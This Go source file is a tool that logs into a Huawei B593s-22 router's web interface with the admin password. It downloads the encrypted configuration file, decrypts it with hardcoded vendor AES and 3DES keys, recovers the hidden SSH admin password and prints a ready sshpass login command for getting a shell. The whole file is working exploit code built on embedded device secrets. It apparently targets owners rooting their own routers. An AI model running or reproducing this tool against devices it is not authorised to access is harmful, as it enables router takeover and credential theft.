package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	loginPost    = "http://%s/index/login.cgi"
	indexPage    = "http://%s/"
	maintainPage = "http://%s/html/management/maintenance.asp"
	confPost     = "http://%s/html/management/downloadconfigfile.conf?RequestFile=/html/management/maintenance.asp"
	rsaModulus   = "BEB90F8AF5D8A7C7DA8CA74AC43E1EE8A48E6860C0D46A5D690BEA082E3A74E1571F2C58E94EE339862A49A811A31BB4A48F41B3BCDFD054C3443BB610B5418B3CBAFAE7936E1BE2AFD2E0DF865A6E59C2B8DF1E8D5702567D0A9650CB07A43DE39020969DF0997FCA587D9A8AE4627CF18477EC06765DF3AA8FB459DD4C9AF3"
	rsaExponent  = "10001"
	passKey      = "3E4F5612EF64305955D543B0AE3508807968905960C44D37"
	passIV       = "8049E91025A6B548"
	confKey      = "3E4F5612EF64305955D543B0AE350880"
	confIV       = "8049E91025A6B54876C3B4868090D3FC"
)

const messagetmpl = `Credentials found! Use:
*************************
sshpass -p '%s' ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc admin@%s
*************************
Once in, type "shell" and hit enter! :)
`

var csrfParamReg = regexp.MustCompile("var csrf_param = \"(\\w+)\";")
var csrfTokenReg = regexp.MustCompile("var csrf_token = \"(\\w+)\";")
var adminPassReg = regexp.MustCompile("<UserInfoInstance InstanceID=\"1\" Username=\"admin\" Userpassword=\"(.+)\" Userlevel=\"0\"/>")

var client = &http.Client{}

//needs to be sent in every request
//changes on every request
type tokens struct {
	csrfParam string
	csrfToken string
}

func main() {
	host := flag.String("host", "192.168.1.1", "B593s-22's ip adress")
	password := flag.String("password", "", "web gui admin password")
	flag.Parse()
	if *password == "" {
		flag.Usage()
		return
	}
	username := "admin"
	jar, err := cookiejar.New(nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not create cookie jar. Error: %v\n", err)
		return
	}
	client.Jar = jar
	root, err := url.Parse(fmt.Sprintf(indexPage, *host))
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not parse B593s-22's ip adress. Error: %v\n", err)
		flag.Usage()
		return
	}
	jar.SetCookies(root, []*http.Cookie{&http.Cookie{Name: "Language", Value: "en_us", Path: "/", Expires: time.Now().AddDate(1, 1, 1)}})
	var t tokens
	err = getTokens(fmt.Sprintf(indexPage, *host), &t, false)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not get tokens from index page. Error: %v\n", err)
		return
	}
	pub, err := rsaPublicKey(rsaModulus, rsaExponent)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not create rsa publick key. Error: %v\n", err)
		return
	}
	passSHA := getSHA(username, *password, &t)
	passEnc, err := rsaEncrypt(passSHA, pub)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not rsa encrypt password sha. Error: %v\n", err)
		return
	}
	err = login(username, passEnc, fmt.Sprintf(loginPost, *host), &t, false)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not login to B593s-22 as admin. Error: %v\n", err)
		return
	}
	err = getTokens(fmt.Sprintf(maintainPage, *host), &t, false)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not get tokens from maintainance page. Error: %v\n", err)
		return
	}
	b, err := dlConf(fmt.Sprintf(confPost, *host), &t, false)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not get the encrypted conf file. Error: %v\n", err)
		return
	}
	conf, err := decryptConf(confKey, confIV, b)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not decrypt the conf file. Error: %v\n", err)
		return
	}
	match := adminPassReg.FindSubmatch(conf)
	if len(match) != 2 {
		fmt.Fprintf(os.Stderr, "Could not find the encrypted ssh admin password\n")
		return
	}
	pass, err := decryptPass(string(match[1]), passKey, passIV)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not decrypt ssh admin password. Error: %v\n", err)
		return
	}
	fmt.Printf(messagetmpl, pass, *host)
}

func decryptConf(key, iv string, b []byte) ([]byte, error) {
	keyByte, ivByte, err := keysToByte(key, iv)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(keyByte)
	if err != nil {
		return nil, err
	}
	blockmode := cipher.NewCBCDecrypter(block, ivByte)
	dec := make([]byte, len(b))
	blockmode.CryptBlocks(dec, b)
	return dec, nil
}

func keysToByte(key, iv string) (keyByte, ivByte []byte, err error) {
	_, err = fmt.Sscanf(key, "%X", &keyByte)
	if err != nil {
		return
	}
	_, err = fmt.Sscanf(iv, "%X", &ivByte)
	if err != nil {
		return
	}
	return
}

func decryptPass(passEnc, key, iv string) (string, error) {
	b, err := base64.StdEncoding.DecodeString(passEnc)
	if err != nil {
		return "", err
	}
	keyByte, ivByte, err := keysToByte(key, iv)
	if err != nil {
		return "", err
	}
	desBlock, err := des.NewTripleDESCipher(keyByte)
	if err != nil {
		return "", err
	}
	desBlockMode := cipher.NewCBCDecrypter(desBlock, ivByte)
	deCrypted := make([]byte, len(b))
	desBlockMode.CryptBlocks(deCrypted, b)
	messageB64 := fmt.Sprintf("%s", deCrypted)
	firstB64 := messageB64[:12]
	secondB64 := messageB64[12:]
	first, err := base64.StdEncoding.DecodeString(firstB64)
	if err != nil {
		return "", err
	}
	aesKey := "12345678" + string(first[:len(first)-1])
	aesMessage, _ := base64.StdEncoding.DecodeString(secondB64)
	aesBlock, err := aes.NewCipher([]byte(aesKey))
	if err != nil {
		return "", err
	}
	rootPass := make([]byte, len(secondB64))
	aesBlock.Decrypt(rootPass, []byte(aesMessage))
	rootPassHex := fmt.Sprintf("%X", rootPass)
	rootPassHex = strings.TrimRight(rootPassHex, "0")
	rootPassString := ""
	_, err = fmt.Sscanf(rootPassHex, "%X", &rootPassString)
	if err != nil {
		return "", err
	}
	return rootPassString, nil
}

func getSHA(username string, password string, t *tokens) string {
	passB64 := base64.StdEncoding.EncodeToString([]byte(password))
	combined := username + passB64 + t.csrfParam + t.csrfToken
	return fmt.Sprintf("%x", sha256.Sum256([]byte(combined)))
}

func findSubmatch(r *regexp.Regexp, in string) (out string, err error) {
	arr := r.FindStringSubmatch(in)
	if len(arr) < 2 {
		return "", fmt.Errorf("no regexp matches")
	}
	return arr[1], nil
}

func rsaModulusToBigInt(m string) (b big.Int, err error) {
	if _, err := fmt.Sscanf(m, "%X", &b); err != nil {
		return b, err
	}
	return
}

func rsaExponentToInt(e string) (i int, err error) {
	if _, err := fmt.Sscanf(e, "%X", &i); err != nil {
		return i, err
	}
	return
}

func rsaPublicKey(mod string, exp string) (pub *rsa.PublicKey, err error) {
	m, err := rsaModulusToBigInt(mod)
	if err != nil {
		return
	}
	e, err := rsaExponentToInt(exp)
	if err != nil {
		return
	}
	pub = new(rsa.PublicKey)
	pub.N = &m
	pub.E = e
	return
}

func rsaEncrypt(in string, pub *rsa.PublicKey) (outB64 string, err error) {
	b, err := rsa.EncryptPKCS1v15(rand.Reader, pub, []byte(in))
	if err != nil {
		return
	}
	//Check different encodings if this does not work
	return base64.StdEncoding.EncodeToString(b), nil
}

func getTokens(link string, t *tokens, debug bool) error {
	resp, err := client.Get(link)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	b, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	err = findTokens(b, t)
	if err != nil {
		return err
	}
	if debug {
		fmt.Println(string(b))
	}
	return nil
}

func findTokens(b []byte, t *tokens) error {
	s, err := findSubmatch(csrfParamReg, string(b))
	if err != nil {
		return err
	}
	t.csrfParam = s
	s, err = findSubmatch(csrfTokenReg, string(b))
	if err != nil {
		return err
	}
	t.csrfToken = s
	return nil
}

func login(username, rsaPassword, link string, t *tokens, debug bool) error {
	v := url.Values{}
	v.Add("Username", username)
	v.Add("Password", rsaPassword)
	v.Add("csrf_param", t.csrfParam)
	v.Add("csrf_token", t.csrfToken)
	resp, err := client.PostForm(link, v)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	b, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if debug {
		fmt.Println(string(b))
	}
	return nil
}

func dlConf(link string, t *tokens, debug bool) ([]byte, error) {
	v := url.Values{}
	v.Add("csrf_param", t.csrfParam)
	v.Add("csrf_token", t.csrfToken)
	resp, err := client.PostForm(link, v)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if debug {
		fmt.Println(string(b))
	}
	return b, nil
}
